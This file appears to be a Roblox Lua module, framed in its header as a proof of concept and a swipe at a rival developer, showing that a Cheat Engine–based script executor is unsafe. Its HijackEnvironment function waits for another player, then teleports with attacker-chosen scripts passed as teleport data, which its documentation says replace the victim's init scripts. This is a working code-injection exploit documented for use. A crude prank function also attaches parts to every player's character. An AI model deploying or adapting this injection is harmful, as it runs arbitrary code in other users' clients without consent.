--[[
	Rune Detection Module
	
	for context on why this was made, it's just to prove
	to nano that the method is doing, is completely unsafe
	and this can go even worse if he keeps attempting to do this
	method from 2008 - 2009

	ill let this notice on here, as nano didn't give a fuck enough
	to actually credit Jayy itself as the owner and just like another
	random guy that helped on this

	jayy WAS THE GUY that created this method and WAS THE GUY that created
	the lua file that you can find on the RUNECE folder at AUTORUN, don't believe me?
	difference both (https://robloxscripts.com/cheat-engine-script-execution-for-byfron-on-roblox-uwp/) and
	the file that you can find at rune directory on `RUNECE\autorun\roblox.lua`

	jayy made this only for proving a point that cheat engine worked on roblox and made this as a joke, not
	to be made like an executor which in fact is being used by nano himself to the point he is making a C++ program
	calling it "Rune External" which is 100% being affected by this same module due to being completely 1:1 just that
	without cheat engine.

	that's all nano, hope you enjoyed stealing fluster and jayy's cheat engine credits and leaving both of us credits
	to no little until we weren't needed for you anymore.

	shotout and credits to alex the great and dottik for mental support and the BALLS function.

	Documentation:

	RuneDetectionModule:IsRunningCheatEngine() -> boolean
		Returns if player is using Cheat Engine

	RuneDetectionModule:HijackEnvironment() -> nil
		Forces the player to replace it's init scripts to
		whatever you want to set them with, scripts must be
		parented to a folder and all selected with :GetChildren
		careless if it's a only single file.
]]

local RuneDetectionModule = {};

local Players = game:GetService("Players");
local TeleportService = game:GetService("TeleportService");

function RuneDetectionModule:IsRunningCheatEngine()
	local DataCount = 0;
	local Data = TeleportService:GetLocalPlayerTeleportData();
	
	if typeof(Data) ~= "table" then
		return false;
	end
	
	for _, obj in next, Data do
		if (typeof(obj) == "Instance" and obj.ClassName == "LocalScript" or obj.ClassName == "ModuleScript") then
			DataCount += 1;
		end
	end

	return (DataCount >= 1)
end

function RuneDetectionModule:HijackEnvironment(scripts: SharedTable)
	if not RuneDetectionModule:IsRunningCheatEngine() then
		return error(`CE not running on this instance`);
	end
	
	if typeof(scripts) ~= "table" then
		return error(`bad argument #1 (table expected, got {typeof(scripts)})`);
	end
	
	-- checking now if there is any other player on the game
	-- if not, wait for another player and make it rejoin the game
	
	repeat task.wait(3)
	until #Players:GetPlayers() > 1
	
	TeleportService:Teleport(game.PlaceId, Players.LocalPlayer, scripts);
end

function RuneDetectionModule:Balls(size_modifier: number)
    if type(size_modifier) ~= "number" then
        size_modifier = 1
    end

    local function ballz(character, namelen)
        spawn(function()
            -- If this is poorly made clap your hands *clap clap*
            -- If this is poorly made clap your hands *clap clap*
            -- If this is poorly made and you really wanna show if this is poorly made clap your hands *clap clap*
            pcall(function()
                while wait() do -- Yes I want this wait here
                    local hum = character:FindFirstChild("Humanoid")
                    if not hum then continue end
                
                    local torso = character:FindFirstChild("LowerTorso") or character:FindFirstChild("Torso")
                    if not torso then continue end
                
                    local head = character:FindFirstChild("Head")
                    if not head then continue end
                
                    local function create(offset)
                        local ball = Instance.new("Part")
                        local weld = Instance.new("Weld")

                        local scale = 1.25 - math.clamp(namelen / 15, 0, 1.1)
                        scale *= size_modifier

                        ball.Size = Vector3.new(scale, scale, scale)
                        ball.CanCollide = false
                        ball.Shape = Enum.PartType.Ball
                        ball.Material = Enum.Material.SmoothPlastic
                        ball.Color = head.Color
                    
                        weld.Part0 = ball
                        weld.Part1 = torso

                        weld.C0 = CFrame.new(offset * scale, (torso == character:FindFirstChild("LowerTorso") and torso.Size.Y or torso.Size.X) / 2 + 0.25 * scale, torso.Size.Z / 2)

                        weld.Parent = ball
                    
                        return ball
                    end
                    local p1 = create(-0.25)
                    local p2 = create(0.25)
                
                    if p1 and p2 then
                        p1.Parent = game.Workspace
                        p2.Parent = game.Workspace
                        
                        table.insert(_G.superiorballsballs, p1)
                        table.insert(_G.superiorballsballs, p2)
                    
                        break
                    else
                        if p1 then
                            p1:Destroy()
                        end
                    
                        if p2 then
                            p2:Destroy()
                        end
                    end
                end
            end)
        end)
    end

    if _G.superiorballsconnections then
        for i,v in pairs(_G.superiorballsconnections) do
            v:Disconnect()
        end
    end
    
    _G.superiorballsconnections = {}

    if _G.superiorballsballs then
        for i,v in pairs(_G.superiorballsballs) do
            v:Destroy()
        end
    end

    _G.superiorballsballs = {}

    for i,v in pairs(game:GetService("Players"):GetPlayers()) do
        if v.Character then
            ballz(v.Character, v.DisplayName:len())
        end
    
        table.insert(_G.superiorballsconnections, v.CharacterAdded:Connect(function(character)
            --print("added character for: ", v.Name)
            ballz(character, v.DisplayName:len())
        end))
    end

    game:GetService("Players").PlayerAdded:Connect(function(plr)
        --warn("Added character: ", plr.Name)
        table.insert(_G.superiorballsconnections, plr.CharacterAdded:Connect(function(character)
            --print("added character for: ", plr.Name)
            ballz(character, plr.DisplayName:len())
        end))
    end)
    
    -- Yes this ignores players I don't care
    while wait(60) do
        local list = {}
        
        for i,v in pairs(superiorballsballs) do
            if v.Parent then
                table.insert(list, v)
            end
        end
        
        _G.superiorballsballs = list
    end
end

return RuneDetectionModule;
